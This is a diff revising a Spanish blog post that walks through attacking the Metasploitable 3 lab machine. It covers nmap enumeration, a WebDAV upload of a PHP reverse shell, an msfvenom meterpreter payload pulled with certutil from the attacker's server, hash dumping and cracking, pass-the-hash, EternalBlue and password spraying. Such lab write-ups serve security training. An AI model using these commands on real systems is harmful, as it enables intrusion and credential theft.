@@ -6,97 +6,131 @@ tags: [cracking, enumeración, Nmap, Metasploit, Hydra y CrackMapExec]
 description: Cómo enumerar usuarios y crackear contraseñas de servicios vulnerables.
 ---
 
-En este artículo, analizaremos las distintas formas de analizar las vulnerabilidades en los sistemas, para este caso utilizaremos una máquia llamada Metaspoitable 3, la cual incluye bastantes servicios instalados que son vulnerables y nos permitirá practicar los conocimientos adquiridos.
+En este artículo, analizaremos distintas metodologías para identificar y explotar vulnerabilidades en sistemas Windows. Para nuestra práctica, utilizaremos la máquina Metasploitable 3, un entorno diseñado con múltiples servicios vulnerables que nos permite poner a prueba habilidades de enumeración y escalada de privilegios.
 
-## Escaneo de Puertos y Enumeración | Windows
-Como ya es de conocimiento, debemos empezar analizando los puertos abiertos que tiene el host destino.
+## 1. Escaneo de Puertos y Enumeración | Windows
+El primer paso es identificar la superficie de ataque del host objetivo.
+
+### Reconocimiento inicial
+Comenzamos verificando la conectividad y realizando un escaneo rápido de todos los puertos abiertos:
 ```shell
+# Verificar conectividad
 ping dominio.local
+
+# Escaneo rápido de todos los puertos (65535)
 nmap -p- -T5 dominio.local
 ```
-1) Iniciaremos por los puertos http con un escaneo completo y anaizar las vulnerabilidades en search exploit.
+
+### Enumeración detallada de servicios
+Una vez identificados los puertos, realizamos un análisis profundo de versiones y scripts predeterminados
+
 ```shell
 nmap -p--T5 -sV -sC -n dominio.local --stats-every 3
 ```
-Durante este análisis recomendamos analizar la página web con los puertos que tenga http, esto lo realizaremos con ayuda del navegador.
 
-En sitios vulnerables de wordpress, se puede analizar el código fuente ya que este servicio puede estar en otro lugar y hay que agregar la ip y el dominio en /etc/hosts.
+> Si el sitio utiliza WordPress o servicios específicos, recuerda mapear la IP y el dominio en tu archivo /etc/hosts para que el navegador resuelva correctamente las rutas internas..
+{: .prompt-tip }
 
-Para saber la información como los nombres de los hosts, se empieza con un crackmapexec.
+Para identificar nombres de host y detalles del protocolo SMB, utilizamos CrackMapExec (o su sucesor, NetExec):
+
 ```shell
 crackmapexec smb dominio.local
 ```
 
-En nuestro navegador accederemos al dominio en conjunto con su puerto.
-http://dominio.local:8585/uploads
+## 2. Explotación Web: Vulnerabilidad WebDAV
+Al navegar por el puerto 8585 (http://dominio.local:8585/uploads), detectamos que el directorio /uploads podría tener habilitado el método PUT.
 
-Con enemap podemos hacer un escaneo de http-enum, cuyo formato es el siguiente:
+Con nmap podemos hacer un escaneo de http-enum, cuyo formato es el siguiente:
+
 ```shell
 nmap -p 8585 --script http-enum -sV dominio.local
 ```
+
 Este comando permite saber que folders permiten recabar información.
 
-Al encontrar una carpeta uploads, podemos probar haciendo un PUT para subir archivos, si lo permite la vulnerabilidad. Para ello ultilizaremos la herramienta davtest.
+### Pruebas con Davtest
+Usamos davtest para verificar automáticamente qué extensiones de archivos permite subir y ejecutar el servidor:
 
 ```shell
 davtest -sendbd -auto -url http://dominio.local:8585/uploads
 ```
-Como resultado del comando anterior, la herramienta intenta crear una carpeta y subir una gran cantidad de extensiones para saber cuales están permitidas y cuales no. También permite saber qué archivos permite ejecutar una vez que se los ha cargado en el server. La ventaja de este comando es saber que exploit podemos subir a un server para escalar privilegios.
+¿Qué estamos haciendo con estos parámetros?
 
-Para subir un archivo personalizado con un script, se ejecuta la herramienta cadaver.
+* -url: Define el directorio objetivo donde WebDAV está activo.
+* -sendbd: Envía archivos que contienen "backdoors" simples para verificar si el servidor interpreta el código.
+* -auto: Automatiza la subida de una amplia biblioteca de extensiones para determinar qué filtros de seguridad tiene el servidor.
 
-En linux podemos buscar reverse shell que ya están listas para su uso.
+### Metodología de la Herramienta
+El funcionamiento de davtest es ingenioso: crea un directorio temporal dentro de /uploads e intenta cargar una ráfaga de ficheros con distintas extensiones (como .php, .txt, .html, .asp, entre otros).
+
+La verdadera potencia de esta herramienta no es solo decirnos qué archivos se subieron, sino confirmar cuáles son ejecutables. Si el reporte final indica que los scripts .php se ejecutan correctamente, tenemos el camino libre para subir una Reverse Shell y tomar el control del servidor.
+
+### Subida de Archivos con Cadaver
+Podemos usar una shell de PHP ya lista en Kali Linux, para ello podemos buscar las propias reverse shell que existen dentro de linux o acceder a repositorios github para buscar reverse shell listas:
+
 ```shell
+# Búsqueda en linux
 locate php-rev
 more /usr/share/laudanum/php/php-reverse-shell.php
 
+#Búsqueda en Linux para cualquier Sistema Operativo.
 http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php
 ```
+
+Los pasos para cargar la shell son los siguientes:
 
 ```shell
 ping dominio.local -I eth0
 arp-scan -I eth1 --localnet
-#para saber que interfaz tiene conexión con el dominio.
+#Buscar cuál es la interfaz que tiene conexión con el dominio.
 
+#Conectarse vía WebDAV y subir el archivo
 cadaver http://dominio.local:8585/uploads
 dav:/uploads/> help
 dav:/uploads/> put php-rev-shell.php
-dav:/uploads/>  
 ```
 
-Al descubrir la vulnerabilidad de que se pueden subir archivos al servicor, se procede a guardar el scipt del php-rev-shell.php; el cuál permitirá hacer una conexión con la shell del servidor.
+### Estableciendo la Conexión
+Preparamos un listener con Netcat en nuestra máquina atacante y ejecutamos el script desde el navegador o davtest:
 
 ```shell
 nc -nlvp 8765
-listing on [any] 8765 ...
-c://wamp/bin/apache/Apache2.2>
 ```
-Desde davtest se procede a abrir el archivo con la shell reversa para tener acceso a la terminal.
+
+## 3. Post-Explotación y Escalada de Privilegios
+Una vez dentro de la CMD de Windows, recolectamos información crítica:
 
 Ahora detallaremos los comándos útiles que podemos emplear en una cmd de Windows
-* systeminfo > Devuelve información revelante del equipo.
+* systeminfo > Información general del sistema y parches faltantes.
 * Whoami > Permite saber cómo está ejecutanto la información el usuario, si tenemos acceso al root sería lo ideal.
 * net user usuariodeprueba password /add > Si tenemos los permisos, podremos crear un usuario de prueba.
 * whoami /priv > Se puede ver los privilegios que posee dicho usuario.
-    SeImpersonatePrivilege > Un privilegio que es importante tener, el cual permite personificar un servicio u otro usuario. Si se tiene habilitado, se puede escalar privilegios a través de distintos binarios. El más útil se llama JuicyPotato.exe o GodPotato.exe o con un módulo de Metasploit.
+    * SeImpersonatePrivilege > Un privilegio importante, el cual permite personificar un servicio u otro usuario. Si se tiene habilitado, se puede escalar privilegios a través de distintos binarios. El más útil se llama JuicyPotato.exe o GodPotato.exe o con un módulo de Metasploit.
+### Migración a Metasploit (Meterpreter)
+Para una gestión más avanzada, migramos nuestra shell básica a una sesión de Meterpreter.
 
-    Para pasar una shell de cmd de windows a Metasploit, se debe realizar lo siguiente:
-    * En linux se debe generar el payload mediante MSFVENOM o https://revshells.com
+* En linux se debe generar el payload mediante MSFVENOM o revshells.com
     * **[Revshells](https://revshells.com)**: Permite construir la línea de msfvenom para crear una revershell y poder escalar privilegios.
-    ```shell
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.0.0.1 LPORT=1234 -f exe -o reverse.exe
-    python3 -m http.server 80
-    ```
+
+#### 1. Generar el Payload e iniciar el servidor:
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=<TU_IP> LPORT=1234 -f exe -o reverse.exe
+python3 -m http.server 80
+```
 > Advertencia: La IP que va en LHOSTS debe ser de la máquina que está atacando.
 {: .prompt-warning }
 
-Ahora en la máquina que ya logré acceder al cmd debo utilizar certutil.exe
-```shell
-c:\\Windows\Temp\ > certutil.exe -f -split -urlcache http://10.0.0.1/reverse.exe reverse.exe
-```
-Con la shell de arriba se logra traer el programa reverse.exe a la máquina Windows y se queda a la espera hasta que msfconsole esté a la escucha y para ejecutarlo se realiza con el nombre reverse.exe.
+#### 2. Transferir el archivo: 
+Levantamos un servidor en Python y usamos certutil.exe en la máquina víctima:
 
-Postrior a eso se debe ejecutar msfconsole
+```shell
+c:\\Windows\Temp\ > certutil.exe -f -split -urlcache http://<TU_IP>/reverse.exe reverse.exe
+```
+
+#### 3.Ejecutar el Handler:
+Con la shell de arriba se logra traer el programa reverse.exe a la máquina Windows y se queda a la espera hasta que msfconsole esté a la escucha.
+
+En Metasploit, configuramos el multi/handler y ejecutamos reverse.exe en la víctima.
 ```shell
 msfconsole -q
 use exploit/multi/handler
@@ -111,8 +145,11 @@ meterpreter> getsystem #Permite escalar privilegios
 
 Ctrl+Z # Permite hacer un backgroud de la sessión
 sessions -i 1 # Permite regresar a la sesión
+```
+## 4. Extracción de Credenciales y Movimiento Lateral
+Dentro de Meterpreter, podemos automatizar la búsqueda de vulnerabilidades de escalada:
 
-Ctrl+Z
+```shell
 use post/multi/recon/local_exploit_suggester
 set session 1
 run #Con esto se puede saber todos los módulos que permiten explotar la máquina
@@ -122,26 +159,35 @@ set payload windows/x64/meterpreter/reverse_tcp
 set LPORT 4923
 set session 1
 exploit #abre una segunda sessión
-
-meterpreter > hashdump #Saca hashes de todos los usuarios
 ```
-
-Para descifrar todos los hashes, se copia todo a un fichero en linux llamado hashes.txt y se procede a descifrar con crackstation.
+### Dumpeo de Hashes
+Si logramos privilegios de administrador, extraemos los hashes de las cuentas locales:
+```shell
+meterpreter > hashdump
+```
+Para descifrar los hashes NTLM obtenidos, puedes usar John the Ripper o servicios online como CrackStation:
 
 > Advertencia: Crackstation solo descifra la segunda parte del hash.
-{: .prompt-warning }
+{: .prompt-tip }
 
+#### Extraer datos de hashes
 ```shell
 cat hashes.txt | cut -d ":" -f 4 #-f es el número de cámpo
 ```
- **[Crackstation](https://crackstation.com)**: Descifra los hashes que sean cómunes y no complejos.
+#### Descifrar con CrackStation
+**[Crackstation](https://crackstation.com)**: Descifra los hashes que sean cómunes y no complejos.
 
-Otra forma para descifrar los hashes es con John the ripper
-
+#### Descifrar con John the ripper
 ```shell
 john hashes.txt --format=NT
 ```
+#### Pass-the-Hash (PtH)
+Si no logras descifrar el hash pero tienes el valor NTLM, puedes autenticarte directamente:
 
+```shell
+crackmapexec smb dominio.local -u Administrador -H "NThash_aqui" -x "whoami"
+```
+#### Módulos útiles de msfconsole
 ```shell
 meterpreter > load kiwi #permite sacar información de credenciales en equipos antiguos que tengan en texto en plano
 meterpreter > help
@@ -152,13 +198,16 @@ meterpreter > load incognito #Permite acceder si el usuario no tiene el permiso 
 meterpreter > list_tokens -u
 ```
 
-Con eso se finaliza la escalación de privilegios.
+## 5. Otras Vulnerabilidades Comunes SMB
 
-##Analizando vulnerabilidades SMB
 ```shell
 ls usr/share/nmap/scripts/ | grep smb #permite ver todos los scripts que tienen smb*
 nmap -p 445,139 --script smb-vuln* dominio.local
+```
 
+### SMB: EternalBlue (MS17-010)
+Si el puerto 445 es vulnerable, Metasploit tiene un módulo directo:
+```shell
 msfconsole -q
 > search type:exploit name:eternalblue
 use exploit/windows/smb/ms17_010_eternalblue
@@ -169,6 +218,7 @@ run
 meterpreter > getuid
 meterpreter > hashdump
 ```
+
 Ahora es importante sacar solo los usuarios
 ```shell
 cat hashes.txt | cut -d ":" -f 1 >> users.txt
@@ -178,10 +228,8 @@ gzip -d /usr/share/wordlists/rockyou.txt.gz
 crackmapexec smb dominio.local -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success
 ```
 
-### Vulnerabilidad RDP 
-> Advertencia: Para esta vulnerabilidad solo se recomineda realizar el escaneo SCAN, no porbar la acción CRASH ya que puede crashear el equipo.
-{: .prompt-warning }
-
+### RDP: BlueKeep (CVE-2019-0708)
+Para escaneo de vulnerabilidades en Escritorio Remoto:
 ```shell
 msfconsole -q
 search bluekeep
@@ -189,6 +237,8 @@ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 set rhosts dominio.local
 run
 ```
+> Advertencia: Al probar BlueKeep, utiliza solo el scanner. El exploit puede causar una Pantalla Azul (BSOD) en el objetivo
+{: .prompt-warning }
 
 ### Vulnerabilidad Pass the hash
 
@@ -212,3 +262,6 @@ crackmapexec smb dominio.local -u usuario -p password
 
 rdesktop dominio.local #para conectarse con el nuevo usuario creado
 ```
+
+## Conclusión
+La explotación en Windows requiere una metodología clara: desde una enumeración minuciosa hasta el aprovechamiento de privilegios mal configurados como SeImpersonate. ¡A seguir practicando en laboratorios controlados!
